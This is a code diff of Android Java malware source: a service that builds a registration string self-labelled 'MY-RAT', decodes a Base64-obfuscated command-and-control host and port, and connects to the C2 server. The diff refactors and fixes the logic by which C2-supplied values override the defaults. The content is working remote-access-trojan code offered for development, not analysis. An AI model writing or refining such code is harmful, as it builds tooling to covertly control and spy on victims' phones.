@@ -213,31 +213,25 @@ public class Api extends Service {
             // Build registration string
             String regString = "@MY-RAT-ALWAYS-SLEEPS_1111_ GODEX & SIMRAN & SELF__" + deviceId;
 
-            // Read stored host/port from SharedPreferences
-            String hostKey  = Config.FTX0;
-            String portKey  = Config.FTX1;
-            String idKey    = Config.FTX2;
-            try { storedId  = Config.FTX2; } catch (Exception unused2) {}
-
             // Decode default host/port from Base64 in love.java
             host = Utils.base64Decode(love.Host);
             port = Utils.base64Decode(love.Port);
 
-            // Save device ID to SharedPreferences if not already saved
-            if (Utils.readPref(context, hostKey).length() == 0) {
-                try {
+            // Save device ID to SharedPreferences
+            String hostKey = Config.FTX0;
+            try {
+                if (Utils.readPref(context, hostKey).length() == 0) {
                     Utils.writePref(context, regString, hostKey);
-                } catch (Exception unused3) {
                 }
-            }
+            } catch (Exception unused2) {}
 
-            // Override host/port with stored values if present
-            if (Utils.readPref(context, portKey).length() != 0) {
-                host = Utils.readPref(context, portKey);
-            }
-            if (Utils.readPref(context, storedId).length() != 0) {
-                port = Utils.readPref(context, storedId);
-            }
+            // Read stored host/port if C2 sent updated values
+            try {
+                String storedHost = Utils.readPref(context, Config.FTX1);
+                String storedPort = Utils.readPref(context, Config.FTX2);
+                if (storedHost != null && storedHost.length() > 0) host = storedHost;
+                if (storedPort != null && storedPort.length() > 0) port = storedPort;
+            } catch (Exception unused3) {}
 
             // Connect to C2 server
             NetworkManager.initialize(host, port, context);
